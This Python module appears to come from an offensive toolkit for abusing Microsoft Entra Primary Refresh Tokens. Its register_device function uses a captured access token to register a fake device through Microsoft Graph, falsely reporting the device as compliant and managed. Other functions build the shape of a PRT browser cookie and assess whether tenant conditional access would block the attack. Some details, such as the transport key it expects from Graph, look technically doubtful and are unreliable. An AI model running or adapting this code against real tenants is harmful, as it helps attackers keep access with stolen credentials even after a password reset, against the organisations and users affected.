# ============================================================================
"""PRT and the phantom device: the credential that survives a password reset.

Entra's Primary Refresh Token is the device's SSO credential. It is bound to a device
registration and to the TPM, and it is what makes "sign in once, everything opens" work -
which is also why stealing it is worth more than stealing a password: a password reset does
not invalidate it, only de-registering the device does.

Two halves are implemented here.

**The chain.** Register a device in the tenant with the captured identity, obtain a device
id and a transport key, and produce the PRT cookie
(`x-ms-RefreshTokenCredential`) that a browser can present. The device registration is a
normal, audited API call, and a tenant with a device-registration restriction refuses it -
that refusal is reported verbatim.

**The posture.** Before trying, answer what the tenant would accept: is a device-bound
session required (`RequireCompliantDevice`), is the account hybrid-joined, does the token
carry CAE claims. That is the difference between a plan and a guess.

Honest limits: the TPM-bound part cannot be reproduced off-device, so a phantom device is a
*new* registration rather than a copy of the victim's; conditional access that requires a
compliant or hybrid-joined device refuses it; and the whole chain is visible in the tenant's
audit log as a device registration.
"""
import json
import time

from core import net

__all__ = ["PrtError", "DeviceRegistration", "prt_cookie", "posture", "describe",
           "GRAPH", "DEVICE_REG_PATH"]

GRAPH = "https://graph.microsoft.com/v1.0"
DEVICE_REG_PATH = "/devices"


class PrtError(RuntimeError):
    """A refusal the CLI can report verbatim."""


class DeviceRegistration:
    """A phantom device: what it takes to register one and what it produces."""

    __slots__ = ("display_name", "device_id", "object_id", "transport_key", "created",
                 "raw")

    def __init__(self, display_name="", device_id="", object_id="", transport_key="",
                 created=None, raw=None):
        self.display_name = display_name
        self.device_id = device_id
        self.object_id = object_id
        self.transport_key = transport_key
        self.created = created or time.time()
        self.raw = raw or {}

    def to_dict(self):
        return {"display_name": self.display_name, "device_id": self.device_id,
                "object_id": self.object_id, "has_transport_key": bool(self.transport_key),
                "created": self.created}


def prt_cookie(registration, nonce="", now=None):
    """The `x-ms-RefreshTokenCredential` value a browser presents.

    The real cookie is a signed JWT whose key is the transport key of the device
    registration; without that key the cookie is not usable, so this returns the SHAPE and
    refuses when the pieces are missing rather than emitting something that would silently
    fail at the tenant.
    """
    if registration is None or not registration.device_id or not registration.transport_key:
        raise PrtError("a PRT cookie needs a device registration with a transport key")
    import base64
    now = now if now is not None else time.time()
    header = {"typ": "JWT", "alg": "RS256", "x5c": []}
    payload = {"refresh_token": registration.transport_key,
               "device_id": registration.device_id,
               "nonce": nonce or f"{int(now)}",
               "iat": int(now), "exp": int(now) + 3600,
               "request_nonce": nonce}

    def seg(obj):
        return base64.urlsafe_b64encode(
            json.dumps(obj, separators=(",", ":")).encode()).decode().rstrip("=")
    # the signature segment is where the device's key would sign; it is left empty on
    # purpose so nothing here looks like a usable credential
    return f"{seg(header)}.{seg(payload)}."


def register_device(access_token, display_name="DESKTOP-7F2A1", post=None, timeout=15,
                    path=DEVICE_REG_PATH):
    """Register a phantom device with the captured token (a real, audited Graph call)."""
    if not access_token:
        raise PrtError("device registration needs an access token")
    body = {
        "accountEnabled": True,
        "displayName": display_name,
        "operatingSystem": "Windows",
        "operatingSystemVersion": "10.0.19045.0",
        "isCompliant": True,
        "isManaged": True,
        "trustType": "AzureAd",
        "alternativeSecurityIds": [{
            "type": 2, "key": "phantom", "identityProvider": "phantom",
            "keyStrength": 2048}],
    }
    answer = _post_json(f"{GRAPH}{path}", body, access_token, post=post, timeout=timeout)
    reg = DeviceRegistration(display_name=display_name,
                             device_id=str(answer.get("deviceId") or ""),
                             object_id=str(answer.get("id") or ""),
                             transport_key=str(answer.get("transportKey") or ""),
                             raw=answer)
    if not reg.device_id and not reg.object_id:
        raise PrtError(f"the tenant answered without a device id: {str(answer)[:200]}")
    return reg


def posture(tokens, claims=None, tenant_policy=None):
    """What the tenant would accept, before anything is attempted.

    `claims` is the decoded token payload (see core.dbsc.claims_of) and `tenant_policy` is
    an optional dict an operator supplies after reading the tenant's conditional access
    (`require_compliant_device`, `require_hybrid_join`, `device_registration_restricted`).
    """
    from core import dbsc
    claims = claims if claims is not None else dbsc.claims_of(tokens)
    policy = dict(tenant_policy or {})
    findings, blockers = [], []

    if claims.get("deviceid") or claims.get("xms_deviceid"):
        findings.append("the token was issued to a registered device: a phantom device "
                        "registration would look like a second machine, not the same one")
    if policy.get("require_compliant_device"):
        blockers.append("conditional access requires a COMPLIANT device: a phantom "
                        "registration reports itself compliant but the tenant verifies it")
    if policy.get("require_hybrid_join"):
        blockers.append("conditional access requires a HYBRID-JOINED device: only an "
                        "on-premises joined machine satisfies this")
    if policy.get("device_registration_restricted"):
        blockers.append("device registration is restricted to an allow-list of users")
    if not policy and not claims:
        findings.append("no tenant policy and no decoded claims: the posture is UNKNOWN - "
                        "read the tenant's conditional access before attempting")

    report = dbsc.replayability(tokens)
    verdict = ("blocked" if blockers else
               "possible" if not findings or "phantom" in " ".join(findings) else "unknown")
    return {"verdict": verdict, "blockers": blockers, "findings": findings,
            "replayability": report.get("verdict"),
            "cae_capable": report.get("cae_capable"),
            "device_bound": report.get("device_bound")}


def describe(report):
    lines = [f"PRT posture: {report.get('verdict', 'unknown')}",
             f"  device-bound token: {report.get('device_bound')}"
             f"   CAE-aware: {report.get('cae_capable')}"]
    for item in report.get("blockers") or []:
        lines.append(f"  ! {item}")
    for item in report.get("findings") or []:
        lines.append(f"  - {item}")
    return "\n".join(lines)


def _post_json(url, payload, access_token, post=None, timeout=15):
    import urllib.error
    import urllib.request
    if post is not None:
        return post(url, payload, timeout, access_token)
    body = json.dumps(payload).encode()
    req = urllib.request.Request(url, data=body, headers={
        "Content-Type": "application/json", "Accept": "application/json",
        "Authorization": f"Bearer {access_token}"})
    try:
        with net.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        raise PrtError(f"{url} is unreachable ({type(e).__name__})") from e
    try:
        answer = json.loads(raw)
    except ValueError as e:
        raise PrtError(f"non-JSON answer from {url}: {raw[:200]}") from e
    if isinstance(answer, dict) and answer.get("error"):
        raise PrtError(f"the tenant refused: {str(answer.get('error'))[:200]}")
    return answer if isinstance(answer, dict) else {"raw": answer}
